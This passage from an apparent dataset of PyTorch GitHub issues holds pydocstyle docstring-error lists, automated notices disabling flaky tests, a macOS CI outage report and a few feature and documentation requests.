fake_quantize.py:214 in public method `extra_repr`:
        D102: Missing docstring in public method
fake_quantize.py:262 in public class `FixedQParamsFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:262 in public class `FixedQParamsFakeQuantize`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:262 in public class `FixedQParamsFakeQuantize`:
        D400: First line should end with a period (not 'n')
fake_quantize.py:268 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:279 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:283 in public method `extra_repr`:
        D102: Missing docstring in public method
fake_quantize.py:292 in public class `FusedMovingAvgObsFakeQuantize`:
        D205: 1 blank line required between summary line and description (found 0)
fake_quantize.py:292 in public class `FusedMovingAvgObsFakeQuantize`:
        D400: First line should end with a period (not 'e')
fake_quantize.py:307 in public method `__init__`:
        D107: Missing docstring in __init__
fake_quantize.py:322 in public method `calculate_qparams`:
        D102: Missing docstring in public method
fake_quantize.py:326 in public method `extra_repr`:
        D102: Missing docstring in public method
fake_quantize.py:342 in public method `forward`:
        D102: Missing docstring in public method
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D200: One-line docstring should fit on one line with quotes (found 2)
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D210: No whitespaces allowed surrounding docstring text
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
fake_quantize.py:480 in private function `_is_fake_quant_script_module`:
        D401: First line should be in imperative mood (perhaps 'Return', not 'Returns')
fake_quantize.py:491 in public function `disable_fake_quant`:
        D400: First line should end with a period (not ':')
fake_quantize.py:502 in public function `enable_fake_quant`:
        D400: First line should end with a period (not ':')
fake_quantize.py:513 in public function `disable_observer`:
        D400: First line should end with a period (not ':')
fake_quantize.py:524 in public function `enable_observer`:
        D400: First line should end with a period (not ':')
fuse_modules.py:1 at module level:
        D100: Missing docstring in public module
fuse_modules.py:39 in public function `fuse_known_modules`:
        D205: 1 blank line required between summary line and description (found 0)
fuse_modules.py:39 in public function `fuse_known_modules`:
        D400: First line should end with a period (not 'd')
fuse_modules.py:39 in public function `fuse_known_modules`:
        D401: First line should be in imperative mood (perhaps 'Return', not 'Returns')
fuse_modules.py:104 in public function `fuse_modules`:
        D400: First line should end with a period (not 'e')
fuse_modules.py:167 in public function `fuse_modules_qat`:
        D200: One-line docstring should fit on one line with quotes (found 2)
fuse_modules.py:167 in public function `fuse_modules_qat`:
        D210: No whitespaces allowed surrounding docstring text
fuse_modules.py:167 in public function `fuse_modules_qat`:
        D400: First line should end with a period (not '`')
fuser_method_mappings.py:1 at module level:
        D100: Missing docstring in public module
fuser_method_mappings.py:18 in public function `fuse_conv_bn`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:55 in public function `fuse_conv_bn_relu`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:102 in public function `fuse_linear_bn`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:131 in public function `fuse_convtranspose_bn`:
        D400: First line should end with a period (not 'e')
fuser_method_mappings.py:154 in private function `_sequential_wrapper2`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:154 in private function `_sequential_wrapper2`:
        D210: No whitespaces allowed surrounding docstring text
fuser_method_mappings.py:154 in private function `_sequential_wrapper2`:
        D400: First line should end with a period (not 's')
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D210: No whitespaces allowed surrounding docstring text
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D300: Use """"""triple double quotes"""""" (found '''-quotes)
fuser_method_mappings.py:182 in public function `get_fuser_method`:
        D400: First line should end with a period (not ',')
fuser_method_mappings.py:205 in private function `_get_valid_patterns`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:205 in private function `_get_valid_patterns`:
        D400: First line should end with a period (not ',')
fuser_method_mappings.py:205 in private function `_get_valid_patterns`:
        D401: First line should be in imperative mood (perhaps 'Return', not 'Returns')
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D205: 1 blank line required between summary line and description (found 0)
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D210: No whitespaces allowed surrounding docstring text
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D400: First line should end with a period (not 'd')
fuser_method_mappings.py:238 in public function `get_fuser_method_new`:
        D401: First line should be in imperative mood; try rephrasing (found 'This')
```

### Suggest a potential alternative/fix

_No response_

cc @svekars @carljparker",False
DISABLED test_2d_optim_state_dict_is_even_sharded_model_False (__main__.TestNew2dParallelStateDict) oncall: distributed triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=periodic%20%2F%20linux-focal-cuda11.8-py3.9-gcc9%20%2F%20test%20(multigpu%2C%201%2C%201%2C%20linux.g5.12xlarge.nvidia.gpu)&jobName=linux-focal-cuda11.8-py3.9-gcc9%20%2F%20test%20(multigpu%2C%201%2C%201%2C%20linux.g5.12xlarge.nvidia.gpu)&failureCaptures=%5B%22distributed%2Ftensor%2Fparallel%2Ftest_fsdp_2d_parallel.py%3A%3ATestNew2dParallelStateDict%3A%3Atest_2d_optim_state_dict_is_even_sharded_model_False%22%5D)).

This test starts failing for multigpu after https://hud.pytorch.org/pytorch/pytorch/commit/9d0c3e21d0b0d7c7a972b56b519b3b2e5732f509

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu @fegin",False
DISABLED test_transpose_inference_mode_interaction_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: asan, linux, mac, macos

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_inference_mode_interaction_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18345948393).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_inference_mode_interaction_cpu_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False
DISABLED test_transpose_inference_mode_interaction_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: linux, win, windows

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_inference_mode_interaction_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18346853353).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_inference_mode_interaction_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False
DISABLED test_softmax_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_softmax_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18342689810).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_softmax_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

ConnectionTimeoutError: Connect timeout for 5000ms, GET https://raw.githubusercontent.com/pytorch/pytorch/main/test/test_nestedtensor.py -2 (connected: false, keepalive socket: false, socketHandledRequests: 1, socketHandledResponses: 0)
headers: {}

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False
Self-hosted MacOS M1 CI outage with broken conda environment ci: sev,"## Current Status
Ongoing

## Error looks like
MacOS M1 jobs all fail due to missing packages

## Incident timeline (all times pacific)
Nov 2nd 2023

## User impact
MacOS M1 jobs are not run

## Root cause
TBD

## Mitigation
Jobs have been marked as unstable:
* https://github.com/pytorch/pytorch/issues/112832
* https://github.com/pytorch/pytorch/issues/102299

## Prevention/followups
TBD
",False
[dynamo] skipping reason is ambiguous in logs ,"### üöÄ The feature, motivation and pitch

Should report which of the following is the reason for skipping

```python
frame.f_lasti >= first_real_inst_idx(frame.f_code)
or skipfiles.check(frame.f_code)
or config.disable
```

### Alternatives

Hard to diagnose skipping reason, making it hard to debug things like:
https://github.com/pytorch/pytorch/pull/112233 
https://github.com/pytorch/pytorch/issues/112865



### Additional context

NIL",False
DISABLED test_transpose_inference_mode_interaction_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_inference_mode_interaction_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18328894360).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_inference_mode_interaction_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False
DISABLED test_transpose_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped actionable,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18328614354).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False
UNSTABLE trunk / macos-12-py3-arm64-mps / test (mps) module: ci unstable,"This starts failing in trunk with a missing package, the root cause is unclear, so I reopen this issue to keep trunk sane while investigate https://hud.pytorch.org/pytorch/pytorch/commit/53fff56ab8fead5b8829367730363c13e206975b

cc @seemethere @malfet @pytorch/pytorch-dev-infra",False
C++ Extension example has incorrect quoting module: cpp-extensions triaged topic: docs,"### üìö The doc issue

The current docstring for [`torch.utils.cpp_extension.CUDAExtension`](https://pytorch.org/docs/stable/cpp_extension.html#torch.utils.cpp_extension.CUDAExtension) includes two examples of invoking it which are formatted incorrectly and aren't copy-pastable as written.

### Suggest a potential alternative/fix

_No response_

cc @malfet @zou3519",False
DISABLED test_layer_norm_backward_size_128_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_size_128_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18292362537).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_size_128_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_meta_outplace_std_mean_cpu_float32 (__main__.TestMetaCPU) triaged module: flaky-tests skipped module: primTorch oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_meta_outplace_std_mean_cpu_float32&suite=TestMetaCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18275880280).

Over the past 3 hours, it has been determined flaky in 14 workflow(s) with 42 failures and 14 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_meta_outplace_std_mean_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_meta.py`

cc @ezyang @mruberry @Lezcano @peterbell10 @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_dropout_backward_layout_torch_strided_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_backward_layout_torch_strided_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18279909555).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_backward_layout_torch_strided_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_dropout_backward_layout_torch_jagged_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_backward_layout_torch_jagged_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18273652592).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_backward_layout_torch_jagged_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
[aot_autograd] Improve aotautograd hygeine by ensuring (asserting) that autocast state is not mutated oncall: pt2 module: aotdispatch,"### üöÄ The feature, motivation and pitch

There is no reason that an fx graph passed to AOTAutograd will not exit all of its graph-instantiated autocast context managers.

For simplicity's sake, let's just assert that these are never mutated when running the fw graph.

### Alternatives

Bugs like those fixed by:
https://github.com/pytorch/pytorch/pull/112231
https://github.com/pytorch/pytorch/pull/112396

### Additional context

NIL

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
"Fix docstring errors in skippable.py, __init__.py, api.py, local_elastic_agent.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `stashable`, **Line**: 79, **Description**: First line should be in imperative mood (perhaps 'Iterate', not 'Iterates')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `poppable`, **Line**: 84, **Description**: First line should be in imperative mood (perhaps 'Iterate', not 'Iterates')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `isolate`, **Line**: 89, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `isolate`, **Line**: 89, **Description**: First line should end with a period (not 'a')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `dispatch`, **Line**: 152, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `dispatch`, **Line**: 152, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `forward`, **Line**: 183, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `forward`, **Line**: 183, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `forward`, **Line**: 183, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `skippable`, **Line**: 243, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `skippable`, **Line**: 243, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `skippable`, **Line**: 243, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `verify_skippables`, **Line**: 350, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/elastic/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerSpec`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_entrypoint_name`, **Line**: 101, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_entrypoint_name`, **Line**: 101, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `Worker`, **Line**: 113, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `Worker`, **Line**: 113, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerState`, **Line**: 187, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `is_running`, **Line**: 231, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `is_running`, **Line**: 231, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `is_running`, **Line**: 231, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerGroup`, **Line**: 240, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerGroup`, **Line**: 240, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_RoleInstanceInfo`, **Line**: 261, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `__init__`, **Line**: 271, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `__init__`, **Line**: 271, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `__init__`, **Line**: 271, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `RunResult`, **Line**: 320, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `RunResult`, **Line**: 320, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `ElasticAgent`, **Line**: 390, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `run`, **Line**: 426, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `run`, **Line**: 426, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `run`, **Line**: 426, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_worker_group`, **Line**: 441, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_worker_group`, **Line**: 441, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_worker_group`, **Line**: 441, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `SimpleElasticAgent`, **Line**: 453, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `SimpleElasticAgent`, **Line**: 453, **Description**: First line should end with a period (not ')')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_start_workers`, **Line**: 470, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_start_workers`, **Line**: 470, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_start_workers`, **Line**: 470, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_stop_workers`, **Line**: 480, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_stop_workers`, **Line**: 480, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_stop_workers`, **Line**: 480, **Description**: First line should be in imperative mood (perhaps 'Stop', not 'Stops')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_monitor_workers`, **Line**: 490, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_monitor_workers`, **Line**: 490, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_monitor_workers`, **Line**: 490, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_shutdown`, **Line**: 498, **Description**: First line should be in imperative mood (perhaps 'Clean', not 'Cleans')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_rendezvous`, **Line**: 538, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_rendezvous`, **Line**: 538, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_rendezvous`, **Line**: 538, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_initialize_workers`, **Line**: 687, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_initialize_workers`, **Line**: 687, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_restart_workers`, **Line**: 719, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_restart_workers`, **Line**: 719, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_exit_barrier`, **Line**: 923, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_exit_barrier`, **Line**: 923, **Description**: First line should end with a period (not 'h')
- **File**: `torch/distributed/elastic/agent/server/local_elastic_agent.py`, **Entity**: `LocalElasticAgent`, **Line**: 47, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/local_elastic_agent.py`, **Entity**: `LocalElasticAgent`, **Line**: 47, **Description**: First line should end with a period (not '`')

cc @carljparker",False
"Fix docstring errors in default_hooks.py, optimizer_overlap.py, checkpoint_wrapper.py, copy.py, benchmark_ddp_rpc.py, utils.py, dependency.py, phony.py, pipeline.py, checkpoint.py, worker.py, batchnorm.py, quantization.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `ActivationWrapper`, **Line**: 22, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: First line should be in imperative mood (perhaps 'Override', not 'Overrides')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: First line should not be the function's ""signature""
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_post_state_dict_hook`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
